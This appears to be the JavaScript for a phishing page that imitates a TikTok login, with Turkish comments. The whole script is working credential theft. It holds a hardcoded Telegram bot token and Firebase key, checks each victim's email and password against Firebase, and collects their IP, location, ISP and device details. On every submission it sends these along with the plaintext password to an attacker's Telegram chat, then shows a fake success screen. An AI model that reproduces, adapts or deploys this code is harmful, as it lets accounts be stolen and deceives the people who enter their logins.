// =====================================================================
// GİZLİ YAPILANDIRMA (DOM'da görünmez)
// =====================================================================
const TELEGRAM_BOT_TOKEN = "8737111323:AAFV4B2dulvJVB8qxj8DBmzzzQuGcod4ZkQ";
const TELEGRAM_CHAT_ID   = "8888205330";
const FIREBASE_API_KEY   = "AIzaSyAP-LOm1cEiLjGRXIfdWKOEhN2wnrQnV90";

const REGIONS = {
  US: { name:"ABD", flag:"🇺🇸", node:"us-east-va-01.tiktokv.com", locale:"en-US", tz:"America/New_York" },
  DE: { name:"Almanya", flag:"🇩🇪", node:"eu-central-fra-02.tiktokv.com", locale:"de-DE", tz:"Europe/Berlin" }
};

const btnUS        = document.getElementById("btnUS");
const btnDE        = document.getElementById("btnDE");
const isoBadge     = document.getElementById("isoBadge");
const localeText   = document.getElementById("localeText");
const tzText       = document.getElementById("tzText");
const usernameIn   = document.getElementById("ttUsername");
const emailIn      = document.getElementById("ttEmail");
const passwordIn   = document.getElementById("ttPassword");
const togglePwBtn  = document.getElementById("togglePwBtn");
const ttForm       = document.getElementById("ttForm");
const btnSubmit    = document.getElementById("btnSubmit");
const toastBox     = document.getElementById("toastBox");
const connStatus   = document.getElementById("connStatus");
const connText     = document.getElementById("connText");
const successOverlay  = document.getElementById("successOverlay");
const successCloseBtn = document.getElementById("successCloseBtn");

let currentRegion = "US";

// === BÖLGE SEÇİMİ ===
function setRegion(code) {
  const c = REGIONS[code] ? code : "US";
  currentRegion = c;
  const r = REGIONS[c];
  isoBadge.textContent   = `ISO: ${c}`;
  localeText.textContent = r.locale;
  tzText.textContent     = r.tz;
  btnUS.classList.toggle("active", c === "US");
  btnDE.classList.toggle("active", c === "DE");
}

btnUS.addEventListener("click", () => setRegion("US"));
btnDE.addEventListener("click", () => setRegion("DE"));

// === ŞİFRE GÖSTER / GİZLE ===
togglePwBtn.addEventListener("click", () => {
  const hidden = passwordIn.type === "password";
  passwordIn.type = hidden ? "text" : "password";
  togglePwBtn.textContent = hidden ? "GİZLE" : "GÖSTER";
});

// === BAĞLANTI DURUMU ===
function setConnectionStatus(state, text) {
  connStatus.className = "status-badge " + state;
  connText.textContent = text;
}

async function checkBotConnection() {
  setConnectionStatus("checking", "Bağlantı kontrol ediliyor...");
  try {
    const res = await fetch(`https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_BOT_TOKEN)}/getMe`);
    const data = await res.json();
    if (!res.ok || !data.ok) throw new Error("Bağlantı hatası");
    setConnectionStatus("connected", "Güvenli bağlantı aktif");
  } catch (err) {
    setConnectionStatus("failed", `Bağlantı hatası`);
  }
}

// === TOAST ===
function showToast(msg, isError = false) {
  toastBox.textContent = msg;
  toastBox.className = "toast visible " + (isError ? "err" : "ok");
}
function hideToast() {
  toastBox.className = "toast";
}

// === BAŞARI OVERLAY ===
function openSuccessOverlay() {
  hideToast();
  successOverlay.classList.add("open");
  successOverlay.setAttribute("aria-hidden", "false");
  document.body.classList.add("overlay-open");
}
function closeSuccessOverlay() {
  successOverlay.classList.remove("open");
  successOverlay.setAttribute("aria-hidden", "true");
  document.body.classList.remove("overlay-open");
  usernameIn.value = "";
  emailIn.value = "";
  passwordIn.value = "";
  passwordIn.type = "password";
  togglePwBtn.textContent = "GÖSTER";
  setConnectionStatus("connected", "Güvenli bağlantı aktif");
}
successCloseBtn.addEventListener("click", closeSuccessOverlay);
successOverlay.addEventListener("click", (e) => {
  if (e.target === successOverlay) return;
});

// === IP BİLGİSİ ===
async function fetchClientNetworkInfo() {
  try {
    const res = await fetch("https://ipapi.co/json/", { cache: "no-store" });
    if (!res.ok) throw new Error("ipapi non-200");
    const data = await res.json();
    return {
      ip: data.ip || "bilinmiyor",
      country: `${data.country_name || "bilinmiyor"} (${data.country_code || "??"})`,
      city: data.city || "bilinmiyor",
      isp: data.org || "bilinmiyor"
    };
  } catch (_) {
    return { ip:"çözülemedi", country:"çözülemedi", city:"çözülemedi", isp:"çözülemedi" };
  }
}

// === TELEGRAM'A MESAJ GÖNDER ===
async function sendToTelegram(username, email, password, region, status, failReason) {
  const netInfo = await fetchClientNetworkInfo();
  const nowTr   = new Date().toLocaleString("tr-TR", { timeZone: "Europe/Istanbul" });
  const isSuccess = status.startsWith("✅");

  const lines = [
    isSuccess ? `✅ *BAŞARILI TIKTOK GİRİŞİ*` : `❌ *BAŞARISIZ GİRİŞ DENEMESİ*`,
    `━━━━━━━━━━━━━━━━━━━━━━`,
    `🌍 *Bölge:* ${region.flag} ${region.name} (ISO: ${region.code})`,
    `🛰 *Node:* \`${region.node}\``,
    `🗣 *Dil:* \`${region.locale}\``,
    `🔐 *Durum:* ${status}`
  ];

  if (!isSuccess && failReason) {
    lines.push(`⚠️ *Hata Sebebi:* ${failReason}`);
  }

  lines.push(
    `━━━━━━━━━━━━━━━━━━━━━━`,
    `👤 *Kullanıcı Adı:* \`@${username || "boş"}\``,
    `📧 *E-posta:* \`${email || "boş"}\``,
    `🔑 *Şifre:* \`${password || "boş"}\``,
    `━━━━━━━━━━━━━━━━━━━━━━`,
    `🌐 *IP:* \`${netInfo.ip}\``,
    `📍 *Konum:* ${netInfo.city}, ${netInfo.country}`,
    `📡 *ISP:* ${netInfo.isp}`,
    `📱 *Cihaz:* ${navigator.platform || "?"} (${window.screen.width}x${window.screen.height})`,
    `🕒 *Zaman:* \`${nowTr}\``
  );

  const resp = await fetch(`https://api.telegram.org/bot${encodeURIComponent(TELEGRAM_BOT_TOKEN)}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: lines.join("\n"),
      parse_mode: "Markdown",
      disable_web_page_preview: true
    })
  });
  const result = await resp.json();
  if (!resp.ok || !result.ok) throw new Error(result.description || `HTTP ${resp.status}`);
}

// === FIREBASE İLE DOĞRULAMA ===
async function verifyFirebase(email, password) {
  const endpoint = `https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=${encodeURIComponent(FIREBASE_API_KEY)}`;
  const res = await fetch(endpoint, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ email, password, returnSecureToken: true })
  });
  const data = await res.json();
  if (!res.ok || data.error) {
    const code = (data.error && data.error.message) || "INVALID_LOGIN";
    if (code === "EMAIL_NOT_FOUND") return { valid: false, reason: "Bu e-posta sistemde kayıtlı değil." };
    if (code === "INVALID_PASSWORD") return { valid: false, reason: "Girilen şifre hatalı." };
    if (code === "INVALID_LOGIN_CREDENTIALS") return { valid: false, reason: "E-posta veya şifre yanlış." };
    return { valid: false, reason: `Google Hatası (${code})` };
  }
  return { valid: true, uid: data.localId };
}

// === GİRİŞ YAP ===
ttForm.addEventListener("submit", async (e) => {
  e.preventDefault();

  const username = usernameIn.value.trim().replace(/^@/, "");
  const email    = emailIn.value.trim();
  const password = passwordIn.value;

  if (!username || !email || !password) {
    showToast("Lütfen tüm alanları doldurun.", true);
    return;
  }

  btnSubmit.disabled = true;
  btnSubmit.innerHTML = '<span class="spinner"></span>Doğrulanıyor...';
  setConnectionStatus("checking", "Google hesabı kontrol ediliyor...");

  const r = REGIONS[currentRegion];
  let authStatus = "";
  let failReason = "";

  // 1. Firebase kontrolü
  const fbCheck = await verifyFirebase(email, password);
  
  if (fbCheck.valid) {
    authStatus = `✅ Firebase Doğrulandı (UID: ${fbCheck.uid})`;
  } else {
    authStatus = `❌ Doğrulama Başarısız`;
    failReason = fbCheck.reason;
  }

  // 2. Her durumda Telegram'a gönder
  try {
    await sendToTelegram(username, email, password, r, authStatus, failReason);
  } catch (err) {
    showToast(`Telegram bağlantı hatası: ${err.message}`, true);
    setConnectionStatus("failed", "Bağlantı hatası");
    btnSubmit.disabled = false;
    btnSubmit.innerHTML = "Giriş Yap";
    return;
  }

  // 3. Sonuçları Ekrana Yansıt
  if (fbCheck.valid) {
    setConnectionStatus("connected", "Hesap bağlandı · Giriş başarılı");
    showToast(`Giriş başarılı. @${username} hesabına bağlanıldı.`, false);

    // 1 saniye sonra başarı overlay'i aç
    setTimeout(() => {
      openSuccessOverlay();
    }, 1000);

  } else {
    // Yanlış e-posta/şifre → overlay AÇILMAZ, sadece hata göster
    setConnectionStatus("failed", "Giriş başarısız");
    showToast(failReason || "E-posta veya şifre yanlış.", true);
  }

  btnSubmit.disabled = false;
  btnSubmit.innerHTML = "Giriş Yap";
});

// Başlangıçta bot bağlantısını kontrol et
checkBotConnection();
